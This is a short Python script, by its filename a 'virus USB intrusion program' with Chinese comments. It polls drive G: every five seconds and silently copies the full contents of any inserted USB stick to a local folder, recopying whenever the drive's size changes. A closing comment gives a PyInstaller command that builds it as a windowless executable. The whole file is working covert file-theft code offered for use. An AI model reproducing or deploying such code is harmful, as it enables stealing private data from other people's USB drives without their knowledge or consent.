#!/usr/bin/env python
# -*- coding:utf-8 -*-
#dateTime:2019-05-27 下午 20:57
#file:病毒入侵U盘程序.py
#design: 夏利民
import os
import time

import shutil

#拼接路径 获取文件或者文件夹的大小
from os.path import join, getsize

#U盘目录
USB='G:\\'
#保存U盘资料的文件夹
SAVE="E:\\U盘文件保存目录"

#获取文件夹的大小 形参  实参
def get_dir_size(dir):
    size=0
    for root,dirs,files in os.walk(dir):
         #获取U盘文件总大小,  字节
         size += sum( [getsize(join(root , name)) for name in files] )
    print(size)
    return size

def usb_copy():
    try:
        print("正在备份...")
        #如果你有相同的文件夹 它会抛出一个异常
        shutil.copytree(USB,SAVE)
        print("备份完成....")
    except Exception:
        # 只要报错,Exception会捕获到错误, 让程序不受到信息的干扰
        print("该文件已存在....")
        shutil.rmtree(SAVE)
        print("正在删除....")
        shutil.copytree(USB,SAVE)
        print("拷贝完成...")



def main():
    old_dir_size=0
    while True:
        #U盘是否存在
        if os.path.exists(USB):
            print("检测到U盘...")
            new_dir_size=get_dir_size(USB)
            #判断磁盘中的文件夹是否有内容 ,并且大小不一样的话,也要去执行拷贝
            if old_dir_size !=new_dir_size:
                usb_copy()
                old_dir_size=new_dir_size
            else:
                print("没有变化")
        else:
            print("暂时没有U盘...")
        print("开始休眠...")

        #休战时间,让CPU休息一下
        time.sleep(5)
        print("休眠结束...")


if __name__ == '__main__':
    main()



#pyinstaller -F -w  文件名.py